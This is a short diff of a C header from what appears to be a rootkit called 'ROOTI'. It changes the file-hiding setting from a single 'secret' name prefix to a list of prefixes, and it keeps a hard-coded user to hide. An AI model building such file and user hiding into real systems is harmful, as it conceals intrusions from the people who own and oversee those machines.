@@ -7,9 +7,9 @@
 extern const char *ROOTI_HIDDEN_FILES[];
 extern const size_t ROOTI_HIDDEN_FILES_COUNT;
 
-// Prefix of files that we wish to hide
-#define ROOTI_HIDE_PREFIX "secret"
-#define ROOTI_HIDE_PREFIX_LEN sizeof(ROOTI_HIDE_PREFIX) - 1
+// Prefix of names of files that should be hidden
+extern const char *ROOTI_HIDDEN_FILES_PREFIXES[];
+extern const size_t ROOTI_HIDDEN_FILES_PREFIXES_COUNT;
 
 // User to hide
 #define ROOTI_HIDE_USER "omri"
